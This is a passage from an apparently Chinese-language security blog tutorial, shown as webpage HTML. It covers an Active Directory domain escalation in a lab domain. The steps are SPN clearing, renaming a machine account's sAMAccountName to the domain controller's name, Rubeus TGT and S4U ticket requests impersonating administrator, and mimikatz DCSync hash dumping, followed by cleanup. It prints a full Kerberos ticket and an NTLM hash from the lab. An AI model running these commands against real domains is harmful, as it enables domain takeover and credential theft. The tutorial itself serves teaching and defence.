+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Set-DomainObject</span> <span class="s2">&#34;CN=WIN-2008R2-2, CN=Computers, DC=missyou, DC=com&#34;</span> <span class="n">-Clear</span> <span class="s1">&#39;serviceprincipalname&#39;</span> <span class="n">-DomainController</span> <span class="s2">&#34;DC.missyou.com&#34;</span>
+</span></span></code></pre></div><h3 id="更改计算机帐户的-samaccountname">更改计算机帐户的 sAMAccountName</h3>
+<p>利用 Powermad.ps1  更改计算机帐户的 sAMAccountName 为域控的主机名, 注意这里不带 $.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Set-MachineAccountAttribute</span> <span class="n">-MachineAccount</span> <span class="s2">&#34;WIN-2008R2-2&#34;</span> <span class="n">-Value</span> <span class="s2">&#34;DC&#34;</span> <span class="n">-Attribute</span> <span class="s1">&#39;sAMAccountName&#39;</span> <span class="n">-DomainController</span> <span class="s2">&#34;DC.missyou.com&#34;</span> <span class="n">-Verbose</span>
+</span></span></code></pre></div><p><img loading="lazy" src="images/Pasted%20image%2020220921163634.png" srcset="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921163634.png, images/Pasted%20image%2020220921163634.png 1.5x, /posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921163634.png 2x" sizes="auto" data-title="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921163634.png" data-alt="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921163634.png" width="1284" height="234" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<h3 id="通过计算机帐户申请-tgt">通过计算机帐户申请 TGT</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">Rubeus3</span><span class="p">.</span><span class="py">5</span><span class="p">.</span><span class="py">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="s2">&#34;DC&#34;</span> <span class="p">/</span><span class="n">password</span><span class="err">:</span><span class="s2">&#34;1234&#34;</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="s2">&#34;missyou.com&#34;</span> <span class="p">/</span><span class="n">dc</span><span class="err">:</span><span class="s2">&#34;DC.missyou.com&#34;</span> <span class="p">/</span><span class="n">nowrap</span>
+</span></span></code></pre></div><p><img loading="lazy" src="images/Pasted%20image%2020220921164046.png" srcset="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921164046.png, images/Pasted%20image%2020220921164046.png 1.5x, /posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921164046.png 2x" sizes="auto" data-title="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921164046.png" data-alt="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921164046.png" width="1250" height="1004" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<h3 id="恢复计算机帐户的-samaccountname">恢复计算机帐户的 sAMAccountName</h3>
+<p>利用 Powermad.ps1  恢复更改的计算机帐户的 sAMAccountName.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Set-MachineAccountAttribute</span> <span class="n">-MachineAccount</span> <span class="s2">&#34;WIN-2008R2-2&#34;</span> <span class="n">-Value</span> <span class="s2">&#34;WIN-2008R2-2$&#34;</span> <span class="n">-Attribute</span> <span class="s1">&#39;sAMAccountName&#39;</span> <span class="n">-DomainController</span> <span class="s2">&#34;DC.missyou.com&#34;</span> <span class="n">-Verbose</span>
+</span></span></code></pre></div><p><img loading="lazy" src="images/Pasted%20image%2020220921164321.png" srcset="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921164321.png, images/Pasted%20image%2020220921164321.png 1.5x, /posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921164321.png 2x" sizes="auto" data-title="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921164321.png" data-alt="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921164321.png" width="1280" height="262" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<h3 id="获取-st">获取 ST</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">Rubeus3</span><span class="p">.</span><span class="py">5</span><span class="p">.</span><span class="py">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">self</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="err">:</span><span class="s2">&#34;administrator&#34;</span> <span class="p">/</span><span class="n">altservice</span><span class="err">:</span><span class="s2">&#34;LDAP/DC.missyou.com&#34;</span> <span class="p">/</span><span class="n">dc</span><span class="err">:</span><span class="s2">&#34;DC.missyou.com&#34;</span> <span class="p">/</span><span class="n">ptt</span> <span class="p">/</span><span class="n">ticket</span><span class="err">:</span><span class="n">doIEsDCCBKygAwIBBaEDAgEWooIDzjCCA8phggPGMIIDwqADAgEFoQ0bC01JU1NZT1UuQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwttaXNzeW91LmNvbaOCA4gwggOEoAMCARKhAwIBAqKCA3YEggNyAMuTwwBIggeu</span><span class="p">+</span><span class="n">WzgCv9ixtwaPs4LsDh7sLXfwBSDPHvrC72VJEHDXXPicFsDW9NpdG09QuyN7Y</span><span class="p">/</span><span class="n">O</span><span class="p">/</span><span class="n">e60LMkhDrMnoLUTx2I9sS9pNsT19DV2Vnx92J6LxanSAUBsDlRLmAfxl</span><span class="p">/</span><span class="n">Dfeyh5nqmfbGPX6RDEqHX9Y4zAMDcw1A</span><span class="p">/</span><span class="n">8Z0asETkw</span><span class="p">/</span><span class="n">Kd</span><span class="p">/</span><span class="n">VHnnDWAerbxWtQETqYzzsUNXgTTxlImfGyKP3ooSz66IJ1SuUxkcBTZOEwdZH5Oa5AFKpDfElQcy22kJ7L8crgndyEBq</span><span class="p">/</span><span class="n">JAZzE</span><span class="p">+</span><span class="n">wKpoAKnfG3YyCc1GywJoRfzl7dfLCWJ9cw8e1fOQfjzXQvl5jx7DqEjrgt1PX7SSmQX</span><span class="p">+</span><span class="n">wKo0vhh1Dt0SGR9XPNRbFeRJkplsJuvFKVnCzjzGkoh</span><span class="p">+</span><span class="n">CbQfkkMfqwNuDY47u12nbKtZMlU6mFOG6fAfbzpElUikOi99BjUKKQubPcL</span><span class="p">/</span><span class="n">YNd99JcYioKSPTQgsS304uW9LKL8hUSat43CKEJaWwJEg71wgj8DhmCYjlnTtBVftWWVssK4WvKJzXqzR0AzNwqkobIuSDTzSO4VwfViPVyvPO3KfU</span><span class="p">+</span><span class="n">rpsYq8YTVBcxY2x9D9Y7bm38eqxb4esL66PtwFLOCLGNKsOW</span><span class="p">/</span><span class="n">Lf8hKOXScByyQH38oHV</span><span class="p">/</span><span class="n">yp4byTZZVDxrp16xbbdnasquzTPVkeXCaSSk0RA0VzSBTVxtgykyfIKCe2hq5Kl9YKB0ZCcxdjKxk3a9</span><span class="p">+</span><span class="n">sjCRHk7SZNp6UxMYCTrKycOcuk4fddFzOs0VQ33R</span><span class="p">/</span><span class="n">badACztK5nXrWcatis5WrfsswwlaaGa0tJjTUWDPeDzgwVIQENx8sMmvSWQPZRU4j7tO1C1U3pnI9kxDYjpYlUSbeRDaNbALQpEZ3Rnx80G8hQCRCDJs4ckf9DGT2HgBfoFU7Z</span><span class="p">+</span><span class="n">zNPJOPYaStnGvUkwgO108RgoIlmJgE79U8JSwzt2v6Y0wfnoZr4ZFg6s</span><span class="p">/</span><span class="n">EmtzEnj</span><span class="p">+/</span><span class="n">YKJIQ53rKY5Tbftzy2iWX61fc4uhBrnjTdQdxjQiXwoSoISvOLRn5ynaDQjVWFFiJkG1P8vnGFzVKj4JkXrbkbPgV9cn1wz</span><span class="p">/</span><span class="n">82cSXdFHKFwp6xDoQXJ</span><span class="p">+</span><span class="n">piA0QjEYibMXtIJvJjRR8RkPA3JT3mOog8oWpyPIvrK1tq2rMQC1rcX67is62eYj</span><span class="p">/</span><span class="n">GNLWk3HpbAN45dXkHXBG8DF</span><span class="p">/</span><span class="n">r0h8LVTfYRoP7o4HNMIHKoAMCAQCigcIEgb99gbwwgbmggbYwgbMwgbCgGzAZoAMCARehEgQQhyFszBsf5qq5CbvTNs1TDaENGwtNSVNTWU9VLkNPTaIPMA2gAwIBAaEGMAQbAkRDowcDBQBA4QAApREYDzIwMjIwOTIxMDg0MDIxWqYRGA8yMDIyMDkyMTE4NDAyMVqnERgPMjAyMjA5MjgwODQwMjFaqA0bC01JU1NZT1UuQ09NqSAwHqADAgECoRcwFRsGa3JidGd0GwttaXNzeW91LmNvbQ</span><span class="p">==</span>
+</span></span></code></pre></div><p><img loading="lazy" src="images/Pasted%20image%2020220921164625.png" srcset="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921164625.png, images/Pasted%20image%2020220921164625.png 1.5x, /posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921164625.png 2x" sizes="auto" data-title="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921164625.png" data-alt="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921164625.png" width="1396" height="1518" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>注意这里获取的是 LDAP 服务的 ST, 所以我们可以 DumpHash, 而不能访问文件服务, 访问文件服务的话可以获取 CIFS 服务的 ST.</p>
+<h3 id="dcsync">DCSync</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">mimikatz</span> <span class="c"># lsadump::DCSync /domain:missyou.com /kdc:DC.missyou.com /user:Administrator</span>
+</span></span></code></pre></div><p><img loading="lazy" src="images/Pasted%20image%2020220921164746.png" srcset="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921164746.png, images/Pasted%20image%2020220921164746.png 1.5x, /posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921164746.png 2x" sizes="auto" data-title="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921164746.png" data-alt="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921164746.png" width="1382" height="596" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<h3 id="恢复计算机帐户的-spn-信息">恢复计算机帐户的 SPN 信息</h3>
+<p>恢复 SPN 是与查看 SPN 顺序相反的, 是依次压入的, 所以要从下往上恢复.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">setspn</span> <span class="n">-S</span> <span class="n">HOST</span><span class="p">/</span><span class="n">WIN</span><span class="p">-</span><span class="n">2008R2</span><span class="p">-</span><span class="mf">2</span><span class="p">.</span><span class="py">missyou</span><span class="p">.</span><span class="py">com</span> <span class="n">WIN</span><span class="p">-</span><span class="n">2008R2</span><span class="p">-</span><span class="mf">2</span><span class="p">$</span>
+</span></span><span class="line"><span class="cl"><span class="n">setspn</span> <span class="n">-S</span> <span class="n">RestrictedKrbHost</span><span class="p">/</span><span class="n">WIN</span><span class="p">-</span><span class="n">2008R2</span><span class="p">-</span><span class="mf">2</span><span class="p">.</span><span class="py">missyou</span><span class="p">.</span><span class="py">com</span> <span class="n">WIN</span><span class="p">-</span><span class="n">2008R2</span><span class="p">-</span><span class="mf">2</span><span class="p">$</span>
+</span></span><span class="line"><span class="cl"><span class="n">setspn</span> <span class="n">-S</span> <span class="n">HOST</span><span class="p">/</span><span class="n">WIN</span><span class="p">-</span><span class="n">2008R2</span><span class="p">-</span><span class="mf">2</span> <span class="n">WIN</span><span class="p">-</span><span class="n">2008R2</span><span class="p">-</span><span class="mf">2</span><span class="p">$</span>
+</span></span><span class="line"><span class="cl"><span class="n">setspn</span> <span class="n">-S</span> <span class="n">RestrictedKrbHost</span><span class="p">/</span><span class="n">WIN</span><span class="p">-</span><span class="n">2008R2</span><span class="p">-</span><span class="mf">2</span> <span class="n">WIN</span><span class="p">-</span><span class="n">2008R2</span><span class="p">-</span><span class="mf">2</span><span class="p">$</span>
+</span></span><span class="line"><span class="cl"><span class="n">setspn</span> <span class="n">-S</span> <span class="n">MSSQLSvc</span><span class="p">/</span><span class="n">WIN</span><span class="p">-</span><span class="n">2008R2</span><span class="p">-</span><span class="mf">2</span><span class="p">.</span><span class="py">missyou</span><span class="p">.</span><span class="py">com</span> <span class="n">WIN</span><span class="p">-</span><span class="n">2008R2</span><span class="p">-</span><span class="mf">2</span><span class="p">$</span>
+</span></span><span class="line"><span class="cl"><span class="n">setspn</span> <span class="n">-S</span> <span class="n">MSSQLSvc</span><span class="p">/</span><span class="n">WIN</span><span class="p">-</span><span class="n">2008R2</span><span class="p">-</span><span class="mf">2</span><span class="p">.</span><span class="py">missyou</span><span class="p">.</span><span class="n">com</span><span class="err">:</span><span class="mf">1433</span> <span class="n">WIN</span><span class="p">-</span><span class="n">2008R2</span><span class="p">-</span><span class="mf">2</span><span class="p">$</span>
+</span></span><span class="line"><span class="cl"><span class="n">setspn</span> <span class="n">-S</span> <span class="n">TERMSRV</span><span class="p">/</span><span class="n">WIN</span><span class="p">-</span><span class="n">2008R2</span><span class="p">-</span><span class="mf">2</span><span class="p">.</span><span class="py">missyou</span><span class="p">.</span><span class="py">com</span> <span class="n">WIN</span><span class="p">-</span><span class="n">2008R2</span><span class="p">-</span><span class="mf">2</span><span class="p">$</span>
+</span></span><span class="line"><span class="cl"><span class="n">setspn</span> <span class="n">-S</span> <span class="n">TERMSRV</span><span class="p">/</span><span class="n">WIN</span><span class="p">-</span><span class="n">2008R2</span><span class="p">-</span><span class="mf">2</span> <span class="n">WIN</span><span class="p">-</span><span class="n">2008R2</span><span class="p">-</span><span class="mf">2</span><span class="p">$</span>
+</span></span></code></pre></div><p>查看是否恢复成功</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">setspn</span> <span class="n">-L</span> <span class="n">WIN</span><span class="p">-</span><span class="n">2008R2</span><span class="p">-</span><span class="mf">2</span><span class="p">$</span>
+</span></span></code></pre></div><p><img loading="lazy" src="images/Pasted%20image%2020220921165909.png" srcset="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921165909.png, images/Pasted%20image%2020220921165909.png 1.5x, /posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921165909.png 2x" sizes="auto" data-title="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921165909.png" data-alt="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921165909.png" width="1368" height="330" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<h3 id="恢复计算机帐户的历史-hash">恢复计算机帐户的历史 Hash</h3>
+<p>拿到域管权限后, 先查看下我们更改了密码的计算机帐户的历史 Hash, 并将其恢复, 防止出现不可控的问题.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">lsadump</span><span class="p">::</span><span class="n">DCSync</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="n">missyou</span><span class="p">.</span><span class="py">com</span> <span class="p">/</span><span class="n">server</span><span class="err">:</span><span class="n">DC</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">WIN</span><span class="p">-</span><span class="n">2008R2</span><span class="p">-</span><span class="mf">2</span><span class="p">$</span>
+</span></span></code></pre></div><p>0 是当前 Hash, 从 1 开始是历史 Hash, 历史 Hash 是按照修改顺序依次排列.</p>
+<p><img loading="lazy" src="images/Pasted%20image%2020220921170327.png" srcset="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921170327.png, images/Pasted%20image%2020220921170327.png 1.5x, /posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921170327.png 2x" sizes="auto" data-title="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921170327.png" data-alt="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921170327.png" width="1236" height="720" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>恢复历史 Hash.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">lsadump</span><span class="p">::</span><span class="n">setntlm</span> <span class="p">/</span><span class="n">server</span><span class="err">:</span><span class="n">DC</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">WIN</span><span class="p">-</span><span class="n">2008R2</span><span class="p">-</span><span class="mf">2</span><span class="p">$</span> <span class="p">/</span><span class="n">ntlm</span><span class="err">:</span><span class="n">fd74002b8a54ca0bdef77a0a372e4fa8</span>
+</span></span></code></pre></div><p><img loading="lazy" src="images/Pasted%20image%2020220921170454.png" srcset="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921170454.png, images/Pasted%20image%2020220921170454.png 1.5x, /posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921170454.png 2x" sizes="auto" data-title="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921170454.png" data-alt="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921170454.png" width="1562" height="468" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>查看是否恢复成功.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">lsadump</span><span class="p">::</span><span class="n">DCSync</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="n">missyou</span><span class="p">.</span><span class="py">com</span> <span class="p">/</span><span class="n">server</span><span class="err">:</span><span class="n">DC</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">WIN</span><span class="p">-</span><span class="n">2008R2</span><span class="p">-</span><span class="mf">2</span><span class="p">$</span>
+</span></span></code></pre></div><p><img loading="lazy" src="images/Pasted%20image%2020220921170639.png" srcset="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921170639.png, images/Pasted%20image%2020220921170639.png 1.5x, /posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921170639.png 2x" sizes="auto" data-title="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921170639.png" data-alt="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921170639.png" width="1242" height="1030" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p><strong>感谢耐心阅读, 文章仅供参考, 本人学艺不精, 不足之处欢迎师傅们指点和纠正!</strong></p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2023-02-03 13:37:22">更新于 2023-02-03&nbsp;</span>
+      </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"></div>
+      <div class="post-info-share">
+        <span></span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/' class="post-tag">域渗透</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/%E5%88%A9%E7%94%A8-keytab-%E5%92%8C-wireshark-%E8%A7%A3%E5%AF%86-kerberos/" class="post-nav-item" rel="prev" title="利用 keytab 和 WireShark 解密 Kerberos"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>利用 keytab 和 WireShark 解密 Kerberos</a>
+      <a href="/posts/%E9%80%9A%E8%BF%87-kerberos-pre-authentication-%E8%BF%9B%E8%A1%8C%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E5%92%8C%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4/" class="post-nav-item" rel="next" title="通过 Kerberos Pre-Authentication 进行域用户帐户枚举和口令爆破">通过 Kerberos Pre-Authentication 进行域用户帐户枚举和口令爆破<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></main></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"}};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
